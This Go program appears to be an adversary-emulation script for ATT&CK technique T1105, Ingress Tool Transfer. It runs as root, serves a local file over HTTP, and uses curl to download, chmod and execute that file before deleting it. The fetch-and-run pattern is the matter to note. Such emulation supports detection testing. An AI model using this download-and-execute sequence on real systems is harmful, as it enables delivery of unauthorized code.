package main

import (
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"script/pkg/system"
	"script/pkg/tags"
)

var (
	ip           = system.GetOutboundIP()
	port         = "54340"
	execFileName = "myapp"
)

func main() {
	if !system.IsRoot() {
		fmt.Printf("%sThe script must be run using root permissions\n", tags.Err)
		return
	}
	fmt.Printf("%sT1105 Ingress Tool Transfer\n", tags.Info)
	go func() {
		err := webServer(port, execFileName)
		if err != nil {
			fmt.Printf("%s%s\n", tags.Err, err.Error())
		}
	}()
	err := getRequest(fmt.Sprintf("http://%s:%s/payload", ip, port), execFileName)
	if err != nil {
		fmt.Printf("%s%s\n", tags.Err, err.Error())
		return
	}
	err = os.Remove(execFileName)
	if err != nil {
		fmt.Printf("%s%s\n", tags.Err, err.Error())
		return
	}
	fmt.Printf("%sFile %s deleted\n", tags.Info, execFileName)
}

func webServer(port string, execFileName string) error {
	http.HandleFunc("/payload", func(w http.ResponseWriter, r *http.Request) {
		filePath := filepath.Join("assets", execFileName)

		file, err := os.Open(filePath)
		if err != nil {
			http.Error(w, "File not found\n", http.StatusNotFound)
			fmt.Printf("%sError opening file: %v\n", tags.Err, err)
			return
		}
		defer file.Close()

		w.Header().Set("Content-Disposition", "attachment; filename=\"myapp\"")
		w.Header().Set("Content-Type", "application/octet-stream")

		http.ServeFile(w, r, filePath)
	})

	fmt.Printf("%sServer is running at http://localhost:%s\n", tags.Log, port)
	err := http.ListenAndServe(":"+port, nil)
	if err != nil {
		return err
	}
	return nil
}

func getRequest(url string, execFileName string) error {
	cmd := exec.Command("curl", "-X", "GET", url, "-o", execFileName)
	err := cmd.Run()
	if err != nil {
		return err
	}
	exec.Command("chmod", "+x", execFileName).Run()
	cmd = exec.Command("./" + execFileName)
	out, err := cmd.Output()
	if err != nil {
		return err
	}
	fmt.Printf("%sThe %s file is running\n", tags.Log, execFileName)
	fmt.Print(string(out))
	return nil
}
